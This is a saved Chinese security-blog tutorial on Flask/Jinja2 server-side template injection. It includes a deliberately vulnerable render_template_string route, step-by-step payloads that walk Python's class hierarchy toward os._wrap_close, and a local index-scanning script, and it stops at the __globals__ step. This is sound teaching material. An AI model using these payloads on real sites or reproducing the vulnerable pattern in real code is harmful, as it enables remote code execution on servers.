<!DOCTYPE html>
<!-- saved from url=(0032)https://tttang.com/archive/1698/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="跳跳糖 - 安全与分享社区">
    <meta name="keywords" content="跳跳糖,安全社区,社区,信息安全,web安全,黑客">
    <title>FLask SSTI从零到入门 - 跳跳糖</title>

    <link rel="shortcut icon" type="image/x-icon" href="https://storage.tttang.com/static/images/icon.png">
    <link rel="stylesheet" href="./FLask SSTI从零到入门 - 跳跳糖_files/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
    <link rel="stylesheet" href="./FLask SSTI从零到入门 - 跳跳糖_files/material-design-iconic-font.min.css">
    <link href="./FLask SSTI从零到入门 - 跳跳糖_files/bootstrap.css" rel="stylesheet">
    <link href="./FLask SSTI从零到入门 - 跳跳糖_files/core.css" rel="stylesheet">
    <link id="override-css-id" href="./FLask SSTI从零到入门 - 跳跳糖_files/theme-indigo.min.css" rel="stylesheet">
    
  <link rel="stylesheet" href="./FLask SSTI从零到入门 - 跳跳糖_files/magnific-popup.css">


    <link rel="stylesheet" href="./FLask SSTI从零到入门 - 跳跳糖_files/app.css">

    <meta name="csrfmiddlewaretoken" content="H3JmxRgISbYP4RykmAilkL4m8u6Qz7JF2dQBUa0t1POK7EZsiKQiiXDWiTYo6OWB">

<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>

<body id="body" data-theme="indigo" class="indigo">

<div class="container-fluid p-0">
  <header class="main-header" translate="no">
    <div class="tt-toolbar">
        <div class="sidebar-mobile-menu">
          <a class="logo" href="https://tttang.com/">
              <img src="./FLask SSTI从零到入门 - 跳跳糖_files/logo.png" alt="logo" class="logo-img"> 跳跳糖
          </a>
        </div>

        <div class="search-bar right-side-icon bg-transparent d-none d-sm-block">
          <form method="get" action="https://tttang.com/">
            <div class="form-group">
                <input class="form-control border-0" name="keyword" placeholder="搜索文章..." type="search">
                <button class="search-icon"><i class="zmdi zmdi-search zmdi-hc-lg"></i></button>
            </div>
          </form>
        </div>

        <ul class="quick-menu header-notifications ml-auto">

            <li class="nav-searchbox dropdown d-inline-block d-sm-none">
                <a href="https://tttang.com/archive/1698/#" data-toggle="dropdown" aria-haspopup="true" class="d-inline-block icon-btn" aria-expanded="false">
                    <i class="zmdi zmdi-search zmdi-hc-fw"></i>
                </a>
                <div aria-hidden="true" class="p-0 dropdown-menu dropdown-menu-right search-bar right-side-icon search-dropdown">
                    <div class="form-group">
                        <input class="form-control border-0" placeholder="" value="" type="search">
                        <button class="search-icon"><i class="zmdi zmdi-search zmdi-hc-lg"></i></button>
                    </div>
                </div>

            </li>

            
            <a href="https://tttang.com/auth/login/" class="gx-btn gx-btn-default gx-btn-label left gx-btn-sm ml-2 ml-xl-3 my-sm-0 mr-0">
              <i class="fa fa-user"></i>
              <span>登录</span>
            </a>
            

        </ul>
    </div>
</header>
</div>



<div class="container mt-4">
  <div class="row justify-content-center">
    <div class="col-md-9 col-sm-12">
      
  
  
  
  <div class="gx-card product-details p-0 mb-4">
    <div class="card-content">
      <div class="pt-4 pl-4 pr-4 pb-0">
        <div class="row justify-content-between mr-0 ml-0">
          <div>
            <h2 class="mb-3">FLask SSTI从零到入门</h2>
          </div>
          
        </div>

        <div class="row justify-content-between mr-0 ml-0">
          <div class="price mb-3">
            <a href="https://tttang.com/user/quan9i" class="mr-1"><span class="h3 author">quan9i</span></a>
            <span class="time">2022-08-15 09:53:00</span>
          </div>
          <div class="pull-right p-0">
            
              <a href="https://tttang.com/sort/python/" class="badge badge-light">Python安全</a>
            
              <a href="https://tttang.com/sort/web-security/" class="badge badge-light">Web安全</a>
            
          </div>
        </div>
      </div>

      <hr class="mt-1">

      <article class="articles"><h1 id="toc_"><a href="https://tttang.com/archive/1698/#toc_">前言</a></h1>
<p>SSTI也是一个比较常见的注入，在学习过后，进行简单总结，希望能对正在学习SSTI的师傅有所帮助。</p>
<h1 id="toc__1"><a href="https://tttang.com/archive/1698/#toc__1">相关知识</a></h1>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/6837a1bd-0af9-4d01-a47c-2d7818eab2da.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/6837a1bd-0af9-4d01-a47c-2d7818eab2da.png"></a></p>
<h2 id="toc_ssti"><a href="https://tttang.com/archive/1698/#toc_ssti">什么是SSTI</a></h2>
<p>SSTI，服务端模板注入，其实也就是模板引擎+注入，那么我们首先需要了解一下模板引擎</p>
<blockquote>
<p>模板引擎是为了使用户界面与业务数据分离而产生，它可以生成特定格式的文档，利用模板引擎来生成前端的 HTML 代码，模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前。</p>
</blockquote>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>常见的模板引擎</p>
<div class="highlight"><pre><span></span><code><span class="nx">PHP</span><span class="o">:</span> <span class="nx">Smarty</span><span class="p">,</span> <span class="nx">Twig</span><span class="p">,</span> <span class="nx">Blade</span>
<span class="nx">JAVA</span><span class="o">:</span> <span class="nx">JSP</span><span class="p">,</span> <span class="nx">FreeMarker</span><span class="p">,</span> <span class="nx">Velocity</span>
<span class="nx">Python</span><span class="o">:</span> <span class="nx">Jinja2</span><span class="p">,</span> <span class="nx">django</span><span class="p">,</span> <span class="nx">tornado</span>
</code></pre></div>

<p>由于渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入.</p>
<h2 id="toc_pycharmflask"><a href="https://tttang.com/archive/1698/#toc_pycharmflask">pycharm搭建flask环境</a></h2>
<p>打开pycharm企业版，点击<code>file</code>，选择flask<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/7cf0781a-2b7a-4f5e-a36b-6ccf5310f729.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/7cf0781a-2b7a-4f5e-a36b-6ccf5310f729.png"></a><br>
默认创建即可<a href="./FLask SSTI从零到入门 - 跳跳糖_files/1d18abc0-fbe0-492e-b790-93714e2b7e5b.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/1d18abc0-fbe0-492e-b790-93714e2b7e5b.png"></a><br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/246491d9-bda0-441a-92f8-13713ae2a68b.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/246491d9-bda0-441a-92f8-13713ae2a68b.png"></a><br>
搭建成功,对内容进行简单讲解如下</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
<span class="o">//</span><span class="n">导入Flask类</span><span class="o">.</span><span class="n">用于后面实例化出一个WSGI应用程序</span><span class="o">.</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="o">//</span><span class="n">创建Flask实例</span><span class="p">,</span><span class="n">传入的第一个参数为模块或包名</span><span class="o">.</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
<span class="o">//</span><span class="n">使用route</span><span class="err">（）</span><span class="n">装饰器告诉Flask什么样的URL能触发我们的函数</span><span class="o">.</span><span class="n">route</span><span class="err">（）</span><span class="n">装饰器把一个函数绑定到对应的URL上</span><span class="err">，</span><span class="n">这里的话就是把helloworld这个函数与这个url绑定</span>
<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>  <span class="c1"># put application's code here</span>
    <span class="k">return</span> <span class="s1">'Hello World!'</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span><span class="n">函数让应用在本地启动</span>
</code></pre></div>

<h3 id="toc__2"><a href="https://tttang.com/archive/1698/#toc__2">模板渲染</a></h3>
<p>Flask的模板引擎是<code>jinja2</code>，文档可以参考这个<br>
<a href="https://svn.python.org/projects/external/Jinja-2.1.1/docs/_build/html/api.html#basics" target="_blank">https://svn.python.org/projects/external/Jinja-2.1.1</a><br>
在给出模板渲染代码之前，我们先在本地构造一个html界面作为模板，位置在<code>"flaskProject\templates\</code>，也就是模板渲染代码的相同位置下，有一个名<code>templates</code>的文件夹，在里面写入一个html文件，内容如下</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>SSTI<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Hello, {{name}}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<p>这里的话,<code>{{}}</code>内是需要渲染的内容，此时我们写我们的模板渲染代码(app.py)，内容如下</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)</span> <span class="c1"># GET取参数name的值</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'test.html'</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">query</span><span class="p">)</span> <span class="c1"># 将name的值传入模板,进行渲染</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
  <span class="o">//</span><span class="n">让操作系统监听所有公网</span> <span class="n">IP</span><span class="p">,</span><span class="n">此时便可以在公网上看到自己的web</span><span class="err">，</span><span class="n">同时开启debug</span><span class="err">，</span><span class="n">方便调试</span><span class="err">。</span>
</code></pre></div>

<p>接下来右键运行<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/8abb3e02-4a01-44a4-917b-7754e0910753.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/8abb3e02-4a01-44a4-917b-7754e0910753.png"></a><br>
访问这个界面<a href="./FLask SSTI从零到入门 - 跳跳糖_files/70e62d09-7824-4d30-9ae2-f43c232c0690.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/70e62d09-7824-4d30-9ae2-f43c232c0690.png"></a><br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/38631ae9-758a-4e5b-808b-58d5eeec7a70.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/38631ae9-758a-4e5b-808b-58d5eeec7a70.png"></a><br>
回显随着参数变化而变化<br>
可以发现此时的7*7是没有进行运算的，那这个注入是怎么产生的呢</p>
<h3 id="toc__3"><a href="https://tttang.com/archive/1698/#toc__3">漏洞成因</a></h3>
<p>当程序员想要偷懒时，把这两个文件合并到一个文件中，就可能造成SSTI模板注入，示例代码如下</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template_string</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)</span>
    <span class="n">template</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">&lt;html&gt;</span>
<span class="s1">  &lt;head&gt;</span>
<span class="s1">    &lt;title&gt;SSTI&lt;/title&gt;</span>
<span class="s1">  &lt;/head&gt;</span>
<span class="s1"> &lt;body&gt;</span>
<span class="s1">      &lt;h3&gt;Hello, </span><span class="si">%s</span><span class="s1"> !&lt;/h3&gt;</span>
<span class="s1">  &lt;/body&gt;</span>
<span class="s1">&lt;/html&gt;</span>
<span class="s1">        '''</span><span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</code></pre></div>

<p>此时我们运行这个文件，去访问一下<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/f4a0eef6-0923-4a82-8a95-c7f11d65777d.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/f4a0eef6-0923-4a82-8a95-c7f11d65777d.png"></a><br>
可以发现里面的语句解析了，这也就意味着产生了SSTI注入，这个时候我们就可以去进行利用了<br>
我们先不急着去学习如何利用，不妨想一下为什么这里会产生SSTI<br>
看后面这个有漏洞的代码<br>
<code>render_template</code>函数在渲染模板的时候使用了<code>%s</code>来动态的替换字符串，<code>Flask</code>中使用了<code>Jinja2</code> 作为模板渲染引擎，<code>{{}}</code>在<code>Jinja2</code>中作为变量包裹标识符，<code>Jinja2</code>在渲染的时候会把{{}}包裹的内容进行解析。比如{{7*7}}会被解析成49。</p>
<h2 id="toc_ssti_1"><a href="https://tttang.com/archive/1698/#toc_ssti_1">SSTI前置知识</a></h2>
<p>在学习SSTI注入之前，我们首先需要了解一些python的魔术方法和内置类</p>
<h3 id="toc_class"><a href="https://tttang.com/archive/1698/#toc_class">—class—</a></h3>
<p><code>__class__</code>用于返回该对象所属的类<br>
示例：</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="s1">'abcd'</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="s1">'&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">tuple</span><span class="s1">'&gt;</span>
</code></pre></div>

<h3 id="toc_base"><a href="https://tttang.com/archive/1698/#toc_base">—base—</a></h3>
<p><code>__base__</code>用于获取类的基类（也称父类）<br>
示例：</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="s1">'&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">object</span><span class="s1">'&gt;</span>
<span class="o">//</span><span class="n">object为str的基类</span>
</code></pre></div>

<h3 id="toc_mro"><a href="https://tttang.com/archive/1698/#toc_mro">—mro—</a></h3>
<p><code>__mro__</code>返回解析方法调用的顺序。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>
示例：</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
<span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">object</span><span class="s1">'&gt;)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">object</span><span class="s1">'&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">object</span><span class="s1">'&gt;</span>
</code></pre></div>

<h3 id="toc_subclasses"><a href="https://tttang.com/archive/1698/#toc_subclasses">—subclasses—()</a></h3>
<p><code>__subclasses__()</code>可以获取类的所有子类<br>
示例</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
<span class="p">[</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">type</span><span class="s1">'&gt;,&lt;class '</span><span class="n">dict_keys</span><span class="s1">'&gt;, &lt;class '</span><span class="n">dict_values</span><span class="s1">'&gt;, &lt;class '</span><span class="n">dict_items</span><span class="s1">'&gt;...]</span>
</code></pre></div>

<h2 id="toc__4"><a href="https://tttang.com/archive/1698/#toc__4">常用过滤器</a></h2>
<p>官方介绍<a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters" target="_blank">https://jinja.palletsprojects.com/en/3.0.x/templates/#filters</a></p>
<blockquote>
<ol>
<li>过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数</li>
<li>可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.</li>
</ol>
</blockquote>
<p>其实就是可以实现一些简单的功能，比如attr()过滤器可以实现代替<code>.</code>，join()可以将字符串进行拼接，reverse可以将字符串反置等等<br>
具体如下所示</p>
<div class="highlight"><pre><span></span><code><span class="nx">length</span><span class="p">()</span> <span class="c1"># 获取一个序列或者字典的长度并将其返回</span>

<span class="nx">int</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将值转换为int类型；</span>

<span class="nx">float</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将值转换为float类型；</span>

<span class="nx">lower</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将字符串转换为小写；</span>

<span class="nx">upper</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将字符串转换为大写；</span>

<span class="nx">reverse</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 反转字符串；</span>

<span class="nx">replace</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span><span class="nx">old</span><span class="p">,</span><span class="k">new</span><span class="p">)</span><span class="nx">：</span> <span class="c1"># 将value中的old替换为new</span>

<span class="k">list</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将变量转换为列表类型；</span>

<span class="nx">string</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将变量转换成字符串类型；</span>

<span class="nb">join</span><span class="p">()</span><span class="nx">：</span><span class="c1"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span>

<span class="nx">attr</span><span class="p">()</span><span class="o">:</span> <span class="c1"># 获取对象的属性</span>
</code></pre></div>

<h2 id="toc_ssti_2"><a href="https://tttang.com/archive/1698/#toc_ssti_2">SSTI语句构造</a></h2>
<p>第一步，拿到当前类，也就是用__class__</p>
<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/e1ded82b-dbf0-4bff-8139-a8d51aaedd7f.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/e1ded82b-dbf0-4bff-8139-a8d51aaedd7f.png"></a><br>
第二步，拿到基类，这里可以用__base__，也可以用__mro__</p>
<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]}}</span>
<span class="n">或</span>
<span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]}}</span>
<span class="n">或</span>
<span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/7317ec8f-4e26-48b9-8bda-c06fdca28337.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/7317ec8f-4e26-48b9-8bda-c06fdca28337.png"></a><br>
第三步，拿到基类的子类，用<code>__subclasses__()</code></p>
<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()}}</span>
<span class="p">[</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">type</span><span class="s1">'&gt;, &lt;class '</span><span class="n">weakref</span><span class="s1">'&gt;, &lt;class '</span><span class="n">weakcallableproxy</span><span class="s1">'&gt;, &lt;class '</span><span class="n">weakproxy</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">int</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">bytearray</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">bytes</span><span class="s1">'&gt;, &lt;class '</span><span class="nb">list</span><span class="s1">'&gt;, </span>
</code></pre></div>

<p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>
大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1:5000/?name=</span><span class="se">\</span>
<span class="s2">        {{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"]}}"</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="c1">#print(res.text)</span>
    <span class="k">if</span> <span class="s1">'os._wrap_close'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div>

<p>运行一下<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/c97e246e-5b0b-4f47-81a1-e2794f34f5c6.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/c97e246e-5b0b-4f47-81a1-e2794f34f5c6.png"></a><br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/ac6e4d25-b711-4930-9fed-bd3e3516dc7e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ac6e4d25-b711-4930-9fed-bd3e3516dc7e.png"></a><br>
接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>
首先<br>
先调用它的__init__方法进行初始化类</p>
<div class="highlight"><pre><span></span><code><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">138</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/8befa05f-5eb6-4cd5-9c8f-3cbf580d1cee.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/8befa05f-5eb6-4cd5-9c8f-3cbf580d1cee.png"></a><br>
然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p>
